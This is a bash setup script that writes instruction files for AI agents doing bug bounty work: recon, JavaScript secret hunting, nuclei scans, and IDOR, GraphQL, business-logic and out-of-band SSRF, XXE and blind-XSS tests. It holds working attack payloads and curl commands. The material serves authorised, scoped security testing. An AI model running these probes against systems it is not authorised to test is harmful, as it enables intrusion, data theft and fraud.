#!/usr/bin/env bash
# ============================================================
# BUG BOUNTY MASTER SETUP — RUN ONCE ON FRESH KALI WSL
# Creates ~/bugbounty/ structure + all skill files
# Usage: bash 00_SETUP_RUN_ONCE.sh
# ============================================================

set -e
BASE="$HOME/bugbounty"

echo "[*] Creating base directory: $BASE"
mkdir -p "$BASE"

# ── SHARED SKILLS (loaded by both Gemini + QwenCode) ──────
SKILLS="$BASE/skills"
mkdir -p \
  "$SKILLS/scope-parser" \
  "$SKILLS/passive-recon" \
  "$SKILLS/active-recon" \
  "$SKILLS/js-analyzer" \
  "$SKILLS/idor-tester" \
  "$SKILLS/api-auditor" \
  "$SKILLS/cve-hunter" \
  "$SKILLS/business-logic" \
  "$SKILLS/upload-tester" \
  "$SKILLS/cloud-checker" \
  "$SKILLS/oob-monitor" \
  "$SKILLS/report-builder" \
  "$SKILLS/evidence-organizer" \
  "$SKILLS/handoff-manager" \
  "$SKILLS/noise-filter" \
  "$SKILLS/scripts"

# ── GLOBAL CONFIG (API keys, creds — never printed) ───────
mkdir -p "$BASE/config"
cat > "$BASE/config/api-keys.env" << 'ENVEOF'
# Source this file — do NOT print or log contents
# export SHODAN_KEY=""
# export SECURITYTRAILS_KEY=""
# export VIRUSTOTAL_KEY=""
# export CENSYS_ID=""
# export CENSYS_SECRET=""
# export CHAOS_KEY=""
# export GITHUB_TOKEN=""
# export INTERACTSH_SERVER="oast.pro"
ENVEOF

cat > "$BASE/config/tools.env" << 'ENVEOF'
# Tool paths (edit if non-standard)
export NUCLEI_TEMPLATES="$HOME/nuclei-templates"
export WORDLISTS="$HOME/wordlists"
export GF_PATTERNS="$HOME/.gf"
export INTERACTSH_SERVER="oast.pro"
ENVEOF

echo "[*] Base structure and config created."

# ── WRITE ALL SKILL FILES ──────────────────────────────────
echo "[*] Writing skill files..."

# -----------------------------------------------------------
cat > "$SKILLS/scope-parser/SKILL.md" << 'SKILL'
# SKILL: scope-parser
# Loads and enforces bug bounty program scope

## Purpose
Parse program scope file and build safe testing boundary.

## Input
- File: ~/bugbounty/TARGET/config/scope.txt  (paste raw H1/Bugcrowd scope here)

## Output Files
- ~/bugbounty/TARGET/recon/scope.md

## Actions
1. Extract in-scope wildcard domains (*.example.com)
2. Extract explicitly in-scope apps/endpoints
3. Extract out-of-scope domains and IP ranges
4. Extract prohibited test types (DoS, SQLi on prod, etc.)
5. Extract rate limits
6. Mark any ambiguous assets as "DO-NOT-TEST" until clarified
7. Write structured scope.md

## scope.md format
```
# Scope — TARGET — DATE

## In-Scope Domains
- *.example.com
- api.example.com

## Out-of-Scope
- store.example.com
- *.third-party.com

## Allowed Vuln Classes
- IDOR, XSS, SSRF, Auth bypass, Business logic, RCE

## Prohibited
- DoS, Social engineering, Physical, Prod DB access

## Rate Limits
- Max 50 req/s on *.example.com
- No automated scanning on /checkout

## Ambiguous (DO NOT TEST YET)
- cdn.example.com — not explicitly listed
```

## Rule
If asset is not explicitly in scope → skip it.
SKILL

# -----------------------------------------------------------
cat > "$SKILLS/passive-recon/SKILL.md" << 'SKILL'
# SKILL: passive-recon
# Zero-touch asset discovery using public sources

## Purpose
Build maximum attack surface without touching target directly.

## Input
- TARGET domain (e.g. att.com)
- ~/bugbounty/TARGET/recon/scope.md

## Output Files
- ~/bugbounty/TARGET/recon/raw/subdomains-*.txt  (per-source)
- ~/bugbounty/TARGET/recon/processed/subdomains.txt  (deduped)
- ~/bugbounty/TARGET/urls/raw/*.txt
- ~/bugbounty/TARGET/urls/processed/all-urls.txt
- ~/bugbounty/TARGET/urls/interesting.txt

## Commands (run in order, pipe through scope filter)

### Subdomains
```bash
T=TARGET
OUT=~/bugbounty/$T/recon

subfinder -d $T -all -recursive -silent | anew $OUT/raw/subdomains-subfinder.txt
assetfinder --subs-only $T | anew $OUT/raw/subdomains-asset.txt
amass enum -passive -d $T -o $OUT/raw/subdomains-amass.txt
chaos -d $T -silent 2>/dev/null | anew $OUT/raw/subdomains-chaos.txt
curl -s "https://crt.sh/?q=%25.$T&output=json" | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u | anew $OUT/raw/subdomains-crt.txt

cat $OUT/raw/subdomains-*.txt | sort -u | python3 ~/bugbounty/skills/scripts/scope_filter.py $T | anew $OUT/processed/subdomains.txt
echo "[+] Total subdomains: $(wc -l < $OUT/processed/subdomains.txt)"
```

### Historical URLs
```bash
gau $T --threads 5 --subs 2>/dev/null | anew ~/bugbounty/$T/urls/raw/gau.txt
waybackurls $T 2>/dev/null | anew ~/bugbounty/$T/urls/raw/wayback.txt
cat ~/bugbounty/$T/urls/raw/*.txt | sort -u | uro | anew ~/bugbounty/$T/urls/processed/all-urls.txt
```

### Interesting URL Extraction
```bash
URLS=~/bugbounty/$T/urls/processed/all-urls.txt
grep -iE "(login|signup|register|reset|invite|admin|dashboard|api/|graphql|upload|download|export|import|webhook|callback|oauth|saml|sso|billing|invoice|payment|token|secret|key|debug|config|backup|swagger|openapi|actuator|\.env|\.git)" $URLS | anew ~/bugbounty/$T/urls/interesting.txt
```

### GitHub Recon
```bash
# Run manually — review results before saving
echo "site:github.com $T api_key OR password OR secret OR token OR internal"
echo "https://github.com/search?q=$T+api_key&type=code"
```

### Shodan Query (if key configured)
```bash
source ~/bugbounty/config/api-keys.env
curl -s "https://api.shodan.io/shodan/host/search?key=$SHODAN_KEY&query=ssl:\"$T\"+http.title:\"$T\"" | jq -r '.matches[].hostnames[]' 2>/dev/null | anew $OUT/raw/subdomains-shodan.txt
```

## Notes
- Never touch target servers during this phase
- All output deduped through anew
- scope_filter.py removes out-of-scope domains automatically
SKILL

# -----------------------------------------------------------
cat > "$SKILLS/active-recon/SKILL.md" << 'SKILL'
# SKILL: active-recon
# Probe live assets, fingerprint tech, detect WAFs, find panels

## Purpose
Identify what is actually running — live hosts, tech stack, admin panels, APIs.

## Input
- ~/bugbounty/TARGET/recon/processed/subdomains.txt

## Output Files
- ~/bugbounty/TARGET/recon/processed/live.txt
- ~/bugbounty/TARGET/recon/processed/live-priority.txt
- ~/bugbounty/TARGET/recon/tech-stack.md
- ~/bugbounty/TARGET/recon/panels.txt
- ~/bugbounty/TARGET/screenshots/

## Commands
```bash
T=TARGET
SUBS=~/bugbounty/$T/recon/processed/subdomains.txt
OUT=~/bugbounty/$T/recon

# DNS resolve
dnsx -l $SUBS -silent -a -resp 2>/dev/null | anew $OUT/processed/resolved.txt

# Live HTTP probe
httpx -l $OUT/processed/resolved.txt \
  -title -tech-detect -status-code -content-length \
  -follow-redirects -silent -threads 50 \
  -o $OUT/processed/live-httpx.json 2>/dev/null
cat $OUT/processed/live-httpx.json | jq -r '.url' 2>/dev/null | anew $OUT/processed/live.txt

# Priority: auth/api/admin/staging hosts
grep -iE "(admin|api\.|dev\.|staging\.|test\.|portal\.|dashboard\.|login\.|manage\.|internal\.|corp\.)" $OUT/processed/live.txt | anew $OUT/processed/live-priority.txt

# Screenshots
gowitness file -f $OUT/processed/live.txt -P ~/bugbounty/$T/screenshots/ --threads 10 2>/dev/null

# Admin/panel detection
grep -iE "(Jenkins|Grafana|Kibana|Prometheus|Jira|GitLab|Portainer|Consul|Vault|phpMyAdmin|Adminer|cPanel|Plesk|Webmin|Nagios|Zabbix)" $OUT/processed/live-httpx.json | jq -r '.url' 2>/dev/null | anew $OUT/processed/panels.txt
```

## Priority Scoring (highest value first)
1. Auth panels on *.dev / *.staging / *.test / *.internal
2. API gateways (api., gateway., kong., apigee.)
3. Admin/management panels
4. Old tech (JBoss, Struts, old PHP, Tomcat)
5. DevOps tools (Jenkins, GitLab, Grafana, Kibana)
6. File upload / document handling services
7. GraphQL endpoints
SKILL

# -----------------------------------------------------------
cat > "$SKILLS/js-analyzer/SKILL.md" << 'SKILL'
# SKILL: js-analyzer
# Extract endpoints, secrets, API routes from JavaScript files

## Purpose
Find hidden API routes, auth tokens, feature flags, internal hostnames buried in JS bundles.

## Input
- ~/bugbounty/TARGET/urls/processed/all-urls.txt
- ~/bugbounty/TARGET/recon/processed/live.txt

## Output Files
- ~/bugbounty/TARGET/js/raw/*.js
- ~/bugbounty/TARGET/js/endpoints.txt
- ~/bugbounty/TARGET/js/secrets-candidates.txt
- ~/bugbounty/TARGET/js/review.md

## Commands
```bash
T=TARGET
OUT=~/bugbounty/$T/js

# Extract JS URLs
cat ~/bugbounty/$T/urls/processed/all-urls.txt | grep -iE "\.js(\?|$)" | sort -u > $OUT/js-urls.txt

# Crawl for JS (active)
katana -l ~/bugbounty/$T/recon/processed/live-priority.txt \
  -d 4 -jc -fx -ef woff,css,png,jpg,svg,gif,ico \
  -silent 2>/dev/null | grep "\.js" | anew $OUT/js-urls.txt

# Download and analyze JS files
mkdir -p $OUT/raw
cat $OUT/js-urls.txt | head -200 | while read url; do
  fname=$(echo $url | md5sum | cut -d' ' -f1).js
  curl -sk --max-time 10 "$url" -o "$OUT/raw/$fname" 2>/dev/null
done

# Extract endpoints from all JS
for f in $OUT/raw/*.js; do
  python3 ~/tools/LinkFinder/linkfinder.py -i "$f" -o cli 2>/dev/null
done | grep -v "^#" | sort -u | anew $OUT/endpoints.txt

# Extract secrets/keys
for f in $OUT/raw/*.js; do
  python3 ~/tools/SecretFinder/SecretFinder.py -i "$f" -o cli 2>/dev/null
done | anew $OUT/secrets-candidates.txt

# Pattern grep for interesting values
grep -rihE "(api_key|apikey|access_token|bearer|secret|password|passwd|private_key|aws_|firebase|stripe|twilio|sendgrid|slack_|webhook)" $OUT/raw/ 2>/dev/null | grep -v "example\|placeholder\|your_key" | anew $OUT/secrets-candidates.txt
```

## Review Process
For each entry in secrets-candidates.txt:
1. Is it a real key or placeholder? → test with curl
2. Does it have actual permissions? → minimum viable test
3. Can it be abused in scope? → document in candidates
Only move to findings if abuse is demonstrated.
SKILL

# -----------------------------------------------------------
cat > "$SKILLS/cve-hunter/SKILL.md" << 'SKILL'
# SKILL: cve-hunter
# Automated CVE and misconfiguration detection via Nuclei + tech fingerprinting

## Purpose
Find known CVEs, EOL software, exposed dev tools, and misconfigurations automatically.
AI assists by correlating tech-stack findings with known CVE databases.

## Input
- ~/bugbounty/TARGET/recon/processed/live.txt
- ~/bugbounty/TARGET/recon/processed/live-priority.txt
- ~/bugbounty/TARGET/recon/tech-stack.md

## Output Files
- ~/bugbounty/TARGET/nuclei/cve-results.txt
- ~/bugbounty/TARGET/nuclei/exposure-results.txt
- ~/bugbounty/TARGET/nuclei/misconfig-results.txt
- ~/bugbounty/TARGET/nuclei/high-critical.txt
- ~/bugbounty/TARGET/nuclei/needs-manual-verify.txt

## Commands
```bash
T=TARGET
LIVE=~/bugbounty/$T/recon/processed/live.txt
PRIORITY=~/bugbounty/$T/recon/processed/live-priority.txt
OUT=~/bugbounty/$T/nuclei
source ~/bugbounty/config/tools.env

# Run CVE templates (priority targets first)
nuclei -l $PRIORITY \
  -t $NUCLEI_TEMPLATES/cves/ \
  -severity critical,high \
  -rate-limit 30 -timeout 10 \
  -silent -jsonl -o $OUT/cve-results.jsonl 2>/dev/null
cat $OUT/cve-results.jsonl | jq -r '[.info.severity, .template-id, .host, .matched-at] | @tsv' > $OUT/cve-results.txt

# Exposures and misconfigs
nuclei -l $LIVE \
  -t $NUCLEI_TEMPLATES/exposures/ \
  -t $NUCLEI_TEMPLATES/misconfiguration/ \
  -t $NUCLEI_TEMPLATES/exposed-panels/ \
  -severity critical,high,medium \
  -rate-limit 20 \
  -silent -jsonl -o $OUT/exposure-results.jsonl 2>/dev/null

# Tech-specific templates
# Auto-detect from tech-stack.md and run matching templates
python3 ~/bugbounty/skills/scripts/tech_nuclei_runner.py \
  --tech-file ~/bugbounty/$T/recon/tech-stack.md \
  --targets $PRIORITY \
  --templates $NUCLEI_TEMPLATES \
  --output $OUT/tech-specific.jsonl

# Extract high/critical
cat $OUT/*.jsonl | jq -r 'select(.info.severity == "critical" or .info.severity == "high") | [.info.severity, .template-id, .matched-at] | @tsv' | sort -u > $OUT/high-critical.txt
```

## AI Analysis Step (Gemini handles this — no tool execution needed)
After nuclei runs, Gemini reads tech-stack.md and:
1. Identifies EOL software versions (PHP < 7.4, Java < 11, etc.)
2. Cross-references with NVD for unpatched CVEs
3. Identifies tech combos with known exploit chains
4. Flags custom/internal tech needing manual testing
5. Outputs prioritized list to nuclei/needs-manual-verify.txt

## Verification Gate
nuclei = lead, NOT finding.
Every nuclei result must be manually verified with curl before reporting.
False positive rate on nuclei templates: ~30%. Always verify.

## EOL Tech Priority List
- PHP < 7.4 → RCE via deserialization, type juggling
- JBoss 4.x/5.x → exposed JMX console, RCE
- Apache Struts → CVE-2017-5638 variants
- Spring Boot Actuator exposed → /env, /heapdump, /shutdown
- Elasticsearch unauth → data exposure
- Jenkins no-auth → script console RCE
- Grafana < 8.3 → CVE-2021-43798 directory traversal
- Confluence → multiple RCE CVEs
- GitLab < 15.x → SSRF, auth bypass
SKILL

# -----------------------------------------------------------
cat > "$SKILLS/idor-tester/SKILL.md" << 'SKILL'
# SKILL: idor-tester
# Systematic IDOR, BOLA, and broken access control testing

## Purpose
Find horizontal and vertical access control flaws on authenticated surfaces.

## Input
- Test account A credentials (loaded from ~/bugbounty/TARGET/config/creds.env)
- Test account B credentials (second account, different user)
- ~/bugbounty/TARGET/recon/attack-surface.md

## Output Files
- ~/bugbounty/TARGET/idor/object-map.md       (all discovered object IDs)
- ~/bugbounty/TARGET/idor/candidates.md        (potential IDORs to verify)
- ~/bugbounty/TARGET/idor/verified.md          (confirmed with impact)

## Phase 1: Object ID Mapping
Log in as Account A. Capture ALL object IDs seen in:
- URL path: /users/ID, /orders/ID, /invoices/ID
- Query params: ?user_id=, ?account=, ?org=
- POST body: {"user_id": X, "owner": Y}
- Response body: IDs in JSON responses
- Headers: X-User-ID, X-Account-ID

Save to idor/object-map.md:
```
| Object Type | Account A ID | Endpoint | Method |
|-------------|-------------|----------|--------|
| user        | 10293       | /api/v1/users/10293 | GET |
| invoice     | inv_48382   | /api/v1/invoices/inv_48382 | GET |
```

## Phase 2: Cross-Account Tests
Using Account B's session token, request Account A's objects:
```bash
# Template curl for IDOR test
A_ID="ACCOUNT_A_OBJECT_ID"
B_TOKEN="ACCOUNT_B_BEARER_TOKEN"
ENDPOINT="https://api.TARGET/v1/users/$A_ID"

curl -s -o /tmp/idor_resp.json -w "%{http_code}" \
  -H "Authorization: Bearer $B_TOKEN" \
  "$ENDPOINT"

# Check: did it return 200 with A's data?
cat /tmp/idor_resp.json | jq '.email, .phone, .address' 2>/dev/null
```

## Phase 3: Vertical Escalation Tests
Using low-privilege token, hit admin-only endpoints:
```bash
LOW_TOKEN="LOW_PRIV_TOKEN"
ADMIN_ENDPOINTS=(
  "/api/v1/admin/users"
  "/api/v1/admin/settings"
  "/api/v1/users/all"
  "/api/v2/admin/logs"
)
for ep in "${ADMIN_ENDPOINTS[@]}"; do
  echo -n "$ep → "
  curl -sk -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $LOW_TOKEN" \
    "https://api.TARGET$ep"
  echo
done
```

## Phase 4: Parameter Manipulation (BOLA)
Modify role/tenant/org parameters in API calls:
```bash
# Original request (Account A's org):
# POST /api/v1/org/12345/invite {"email": "x@x.com"}
# Test: change org ID to Account B's org
curl -s -X POST "https://api.TARGET/api/v1/org/99999/invite" \
  -H "Authorization: Bearer $A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@test.com"}'
```

## Validation Gate
Only move to verified.md if:
- [ ] Response contains other user's PII or sensitive data
- [ ] Action was performed on other user's account
- [ ] Reproduces 3/3 times reliably
- [ ] Impact is cross-account or privilege escalation
- [ ] Evidence captured (request + response snippet, redacted)
SKILL

# -----------------------------------------------------------
cat > "$SKILLS/api-auditor/SKILL.md" << 'SKILL'
# SKILL: api-auditor
# REST and GraphQL API security testing

## Purpose
Find auth bypass, mass assignment, verb tampering, GraphQL flaws, API versioning issues.

## Input
- ~/bugbounty/TARGET/js/endpoints.txt
- ~/bugbounty/TARGET/recon/api_endpoints.txt
- Burp Suite proxy history (via MCP)

## Output Files
- ~/bugbounty/TARGET/api/inventory.md
- ~/bugbounty/TARGET/api/candidates.md

## REST API Tests

### 1. Auth Strip Test
```bash
ENDPOINT="https://api.TARGET/v1/users"
# With auth (baseline)
curl -sk -o /tmp/auth.json -w "\n%{http_code}" \
  -H "Authorization: Bearer $TOKEN" "$ENDPOINT"
# Without auth
curl -sk -o /tmp/noauth.json -w "\n%{http_code}" "$ENDPOINT"
# Compare: same response? → auth bypass
diff /tmp/auth.json /tmp/noauth.json
```

### 2. HTTP Verb Tampering
```bash
for METHOD in GET POST PUT PATCH DELETE HEAD OPTIONS TRACE; do
  echo -n "$METHOD → "
  curl -sk -X $METHOD -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $LOW_TOKEN" \
    "https://api.TARGET/v1/admin/settings"
  echo
done
```

### 3. API Version Downgrade
```bash
# Test if old version has weaker auth
for VER in v1 v2 v3 v0 beta internal; do
  echo -n "/api/$VER/users → "
  curl -sk -o /dev/null -w "%{http_code}" \
    "https://api.TARGET/api/$VER/users"
  echo
done
```

### 4. Mass Assignment
```bash
# Add unexpected fields to POST/PUT requests
curl -s -X POST "https://api.TARGET/v1/users/profile" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "test", "role": "admin", "is_admin": true, "plan": "enterprise", "credits": 99999}'
# Check if any privileged field was accepted
```

## GraphQL Tests
```bash
# 1. Introspection (is it enabled?)
curl -s -X POST "https://api.TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{__schema{types{name}}}"}' | jq '.data.__schema.types[].name'

# 2. Auth bypass via alias batching
curl -s -X POST "https://api.TARGET/graphql" \
  -H "Authorization: Bearer $LOW_TOKEN" \
  -d '{"query": "{ a1: adminQuery { secret } a2: adminQuery { secret } }"}'

# 3. Directive injection
curl -s -X POST "https://api.TARGET/graphql" \
  -d '{"query": "{ user(id: 1) @skip(if: false) { email password } }"}'
```

## Reporting Rule
API finding requires:
- Endpoint + method documented
- Auth state that triggers the flaw
- Request + response as evidence
- Impact (what data/action is accessible)
SKILL

# -----------------------------------------------------------
cat > "$SKILLS/oob-monitor/SKILL.md" << 'SKILL'
# SKILL: oob-monitor
# Out-of-band callback management for blind SSRF, XXE, SSTI, RCE detection

## Purpose
Detect blind vulnerabilities that don't show output directly.

## Setup (run once per session)
```bash
source ~/bugbounty/config/api-keys.env
# Start interactsh listener in background
interactsh-client -server $INTERACTSH_SERVER -v 2>&1 | tee ~/bugbounty/TARGET/logs/oob.log &
OOB_PID=$!
echo "OOB listener PID: $OOB_PID"
# Your unique callback URL is printed on startup — save it
OOB_URL=$(grep -m1 "https://" ~/bugbounty/TARGET/logs/oob.log | awk '{print $NF}')
echo "OOB URL: $OOB_URL"
```

## Usage in Tests

### SSRF Test
```bash
# Find URL-taking params
cat ~/bugbounty/TARGET/urls/interesting.txt | \
  grep -iE "(url=|src=|href=|uri=|dest=|target=|redirect=|fetch=|load=|import=|callback=)" | \
  while read u; do
    modified=$(echo "$u" | sed "s/\(url=\|src=\|href=\|uri=\)[^&]*/\1$OOB_URL\/ssrf-test/g")
    curl -sk "$modified" -o /dev/null &
  done
# Watch oob.log for callbacks
```

### Blind XSS Test (dalfox)
```bash
dalfox file ~/bugbounty/TARGET/urls/interesting.txt \
  --blind "$OOB_URL" \
  --skip-mining-dom \
  --timeout 5 \
  -o ~/bugbounty/TARGET/poc/xss-oob-candidates.txt 2>/dev/null
```

### XXE Test (on XML upload endpoints)
```bash
XXE_PAYLOAD="<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"http://$OOB_URL/xxe-test\">]><r>&xxe;</r>"
curl -s -X POST "https://TARGET/api/upload" \
  -H "Content-Type: application/xml" \
  -H "Authorization: Bearer $TOKEN" \
  -d "$XXE_PAYLOAD"
```

## Callback Analysis
```bash
# Check for new callbacks every 30 minutes
tail -f ~/bugbounty/TARGET/logs/oob.log | grep -v "^$"

# Correlate: when did callback arrive? what was running?
grep "$(date +%H:%M)" ~/bugbounty/TARGET/logs/commands.log
```

## OOB Hit → Investigation Protocol
1. Note exact time of callback
2. Check commands.log for what was running at that time
3. Identify the exact parameter/endpoint that triggered it
4. Manually reproduce with curl
5. Attempt to escalate: can you read internal files? hit cloud metadata?
6. Document as BLIND-SSRF candidate → escalate to impact verification

## Stop listener
```bash
kill $OOB_PID
```
SKILL

# -----------------------------------------------------------
cat > "$SKILLS/business-logic/SKILL.md" << 'SKILL'
# SKILL: business-logic
# Workflow mapping and logic flaw testing

## Purpose
Find flaws that automation misses: skippable steps, race conditions, price manipulation, privilege bypass through workflow.

## Input
- Application under test (authenticated session required)
- ~/bugbounty/TARGET/recon/attack-surface.md

## Output Files
- ~/bugbounty/TARGET/business-logic/workflows.md
- ~/bugbounty/TARGET/business-logic/candidates.md

## Step 1: Workflow Mapping
For each key workflow, document every step:
```
Workflow: Subscription Upgrade
Step 1: GET /billing → displays plans
Step 2: POST /billing/select {"plan": "pro"} → creates pending upgrade
Step 3: POST /billing/payment {"card": X} → charges card
Step 4: GET /billing/confirm → confirms upgrade
```

## Step 2: Logic Tests Per Workflow

### Step Skipping
```bash
# Can you jump from step 1 directly to step 4?
# Skip payment step entirely:
curl -s -X GET "https://TARGET/billing/confirm" \
  -H "Authorization: Bearer $TOKEN" \
  -b "session=$SESSION"
```

### Race Condition (parallel requests)
```bash
# Script: send N identical state-changing requests simultaneously
python3 ~/bugbounty/skills/scripts/race_condition.py \
  --url "https://TARGET/api/apply-coupon" \
  --method POST \
  --data '{"coupon": "DISCOUNT50"}' \
  --token "$TOKEN" \
  --threads 20 \
  --output ~/bugbounty/TARGET/business-logic/race-results.txt
```

### Negative / Zero Values
```bash
curl -s -X POST "https://TARGET/api/cart/add" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"item_id": 123, "quantity": -999, "price": -1.00}'
```

### Parameter Pollution
```bash
# Send duplicate params with different values
curl -s "https://TARGET/api/transfer?amount=100&amount=0.01" \
  -H "Authorization: Bearer $TOKEN"
```

### Invite/Permission Scope Abuse
```bash
# Can you invite someone to an org you don't belong to?
curl -s -X POST "https://TARGET/api/org/OTHER_ORG_ID/invite" \
  -H "Authorization: Bearer $YOUR_TOKEN" \
  -d '{"email": "test@test.com", "role": "admin"}'
```

## High-Value Logic Flaws
- Apply coupon twice (race condition)
- Upgrade subscription without payment (step skip)
- Get admin role via invite manipulation
- Transfer funds with negative amount
- Export other user's data via batch export
- Downgrade competitor's account
- Extend free trial indefinitely
SKILL

# -----------------------------------------------------------
cat > "$SKILLS/report-builder/SKILL.md" << 'SKILL'
# SKILL: report-builder
# Formats verified findings into HackerOne-ready reports

## Purpose
Transform validated bugs into professional, triager-accepted reports.

## Input
- Verified finding with impact + PoC
- Evidence files from ~/bugbounty/TARGET/poc/ and ~/bugbounty/TARGET/evidence/

## Output
- ~/bugbounty/TARGET/reports/drafts/FINDING_NAME.md
- Copy final to ~/bugbounty/TARGET/reports/final/ after review

## Report Template
```markdown
# [CLEAR VULNERABILITY TITLE — e.g. "IDOR in /api/v1/invoices allows cross-account data access"]

## Severity: [Critical / High / Medium / Low]
## CVSS: [score and vector if applicable]
## Asset: [exact domain and endpoint]
## Weakness: [CWE-639 IDOR / CWE-285 Auth / etc.]

---

## Summary
[2–3 sentences. What is broken, where it is, and what an attacker can do.]

## Impact
- **Who can exploit:** [any authenticated user / unauthenticated / specific role]
- **What they can access/do:** [read other users' invoices / escalate to admin / etc.]
- **Affected users:** [all users / enterprise tier / specific region]
- **Business consequence:** [data breach / financial fraud / compliance violation]

## Preconditions
- Account required: yes — free tier / any role
- Victim interaction: none
- Special config: none

## Steps to Reproduce
1. Create Account A (attacker) and Account B (victim)
2. Log in as Account B, note your invoice ID: `inv_48382`
3. Log in as Account A
4. Send the following request:
   [PASTE EXACT REQUEST]
5. Observe that Account B's invoice data is returned

## Proof of Concept

### Request
```http
GET /api/v1/invoices/inv_48382 HTTP/1.1
Host: api.TARGET.com
Authorization: Bearer [ACCOUNT_A_TOKEN_REDACTED]
```

### Response (200 OK — Account B's data)
```json
{
  "invoice_id": "inv_48382",
  "user_email": "[REDACTED — victim email]",
  "amount": 299.00,
  "card_last4": "4242"
}
```

## Evidence
- Screenshot: poc/idor-invoice-screenshot.png
- Full request/response: poc/idor-invoice-burp.txt

## Root Cause
Missing server-side ownership validation. The endpoint fetches invoice by ID without confirming the requesting user owns the invoice.

## Remediation
Add ownership check before returning invoice:
`if invoice.user_id != current_user.id: return 403`

## Retest
Repeat Steps 1–5 after fix. Response should be 403 Forbidden for Account A.
```

## Pre-Submit Checklist
- [ ] Reproduces 3/3 times
- [ ] No real user PII in report (use test accounts)
- [ ] Tokens/keys redacted
- [ ] Severity matches actual impact (not inflated)
- [ ] Steps clear enough for triager to reproduce alone
- [ ] PoC attached
- [ ] Would a triager pay this without asking questions? YES → submit
SKILL

# -----------------------------------------------------------
cat > "$SKILLS/noise-filter/SKILL.md" << 'SKILL'
# SKILL: noise-filter
# Quickly classify findings as valid vs noise

## Purpose
Save tokens and time — reject low-value findings fast without deep analysis.

## Auto-Reject (move directly to noise.md, do not analyze further)
These are NEVER valid standalone reports:
- Missing security headers (X-Frame-Options, CSP, HSTS)
- Clickjacking (no sensitive action on page)
- SPF / DKIM / DMARC warnings
- Version disclosure in headers
- Banner disclosure
- Robots.txt content
- Public documentation exposure
- Logout CSRF
- Self-XSS (only attacker can trigger)
- Open redirect (no chain to phishing or token theft)
- CORS permissive (no credentials, no sensitive data)
- Rate limiting absent (no abuse demonstrated)
- GraphQL introspection enabled (alone, no data exposed)
- Public API key (no demonstrated API abuse)
- Verbose error message (no sensitive internal data)
- Scanner-only CVE result (template fired, not manually verified)
- Username enumeration (unless program explicitly accepts)

## Needs Chain to Report
These can be valid IF chained to real impact:
- Open redirect → chain to OAuth token steal → REPORT
- CORS → + credentials + sensitive data → REPORT
- GraphQL introspection → + auth bypass → REPORT
- Rate limit → + account takeover via brute force → REPORT
- Version disclosure → + unpatched CVE confirmed → REPORT

## Severity Inflation Check
Downgrade if:
- "Critical" XSS requires victim to be admin AND have special config → HIGH at best
- "High" IDOR only exposes non-sensitive data (username, public ID) → LOW/MEDIUM
- "High" SSRF only hits internal IPs with no data returned → MEDIUM

## Quick Triage Questions (answer all YES to report)
1. Is the asset in scope?
2. Is the vuln class allowed?
3. Can I reproduce it right now?
4. Does it have REAL exploitable impact?
5. Do I have request + response as evidence?
6. Would a stranger triager pay this?
SKILL

# -----------------------------------------------------------
cat > "$SKILLS/handoff-manager/SKILL.md" << 'SKILL'
# SKILL: handoff-manager
# QwenCode → Gemini clean status updates

## Purpose
Keep both agents synchronized without dumping raw output into context.

## File: ~/bugbounty/TARGET/gemini-handoff/status.md

## Update this file after every major phase or finding.

## Format
```markdown
# Handoff Status — TARGET — [DATE TIME]

## Phase Completed
[passive-recon / active-recon / js-analysis / idor / api / etc.]

## Key Numbers
- Subdomains found: X
- Live hosts: X
- Interesting URLs: X
- JS endpoints extracted: X
- Nuclei high/critical: X

## Important File Paths
- Live hosts: ~/bugbounty/TARGET/recon/processed/live.txt
- Priority targets: ~/bugbounty/TARGET/recon/processed/live-priority.txt
- All URLs: ~/bugbounty/TARGET/urls/processed/all-urls.txt
- JS endpoints: ~/bugbounty/TARGET/js/endpoints.txt
- IDOR candidates: ~/bugbounty/TARGET/idor/candidates.md
- Nuclei high/critical: ~/bugbounty/TARGET/nuclei/high-critical.txt

## Tech Stack Found
- [Framework: version — e.g. "Strapi 3.6.2 on dev.target.com"]
- [Server: "Tomcat 7 on legacy.target.com"]
- [CMS: "WordPress 5.8 on blog.target.com"]

## Top 5 Attack Surfaces (ranked by value)
1. [e.g. api.target.com — authenticated REST API, IDOR candidates in /users/ID]
2. [e.g. dev.target.com/admin — exposed admin panel, no auth on /admin/logs]
3. [e.g. Strapi CMS — version 3.6.2 — CVE-2023-22621 candidate]
4. [e.g. GraphQL at target.com/graphql — introspection on, auth untested]
5. [e.g. File upload at target.com/upload — SVG accepted, XSS not yet tested]

## OOB Callbacks (if any)
- [Timestamp → endpoint that triggered → next action]

## Candidates Needing Gemini Reasoning
| # | What | Asset | Evidence File | Missing |
|---|------|-------|---------------|---------|
| 1 | Possible IDOR | /api/v1/users/ID | idor/candidates.md | Need 2nd account to verify |
| 2 | Nuclei CVE hit | dev.target.com | nuclei/high-critical.txt | Manual verification curl |

## Verified Findings Ready to Report
| # | Title | Severity | PoC File |
|---|-------|----------|----------|
| 1 | [title] | High | poc/finding1.txt |

## Dead Ends This Session
- [What failed, why, evidence path]

## Recommended Next Actions for Gemini
1. [Highest priority reasoning task]
2. [Second priority]
3. [Third priority]
```

## Update Trigger
QwenCode updates this file:
- After passive recon completes
- After active recon completes
- After JS analysis completes
- After any nuclei scan completes
- After any IDOR test batch completes
- When any OOB callback arrives
- Before ending session
SKILL

# -----------------------------------------------------------
# Write helper scripts
cat > "$SKILLS/scripts/scope_filter.py" << 'PYEOF'
#!/usr/bin/env python3
"""Filter subdomains to in-scope only. Usage: cat subs.txt | python3 scope_filter.py TARGET"""
import sys
import re

if len(sys.argv) < 2:
    print("Usage: cat subs.txt | python3 scope_filter.py TARGET", file=sys.stderr)
    sys.exit(1)

target = sys.argv[1].lower()
root = target.replace("www.", "")

for line in sys.stdin:
    line = line.strip().lower()
    if not line:
        continue
    # Accept if ends with target root domain
    if line == root or line.endswith("." + root):
        print(line)
PYEOF

cat > "$SKILLS/scripts/race_condition.py" << 'PYEOF'
#!/usr/bin/env python3
"""Race condition tester — sends N identical requests in parallel."""
import argparse
import concurrent.futures
import requests
import json
import time

def send_request(url, method, data, token, headers=None):
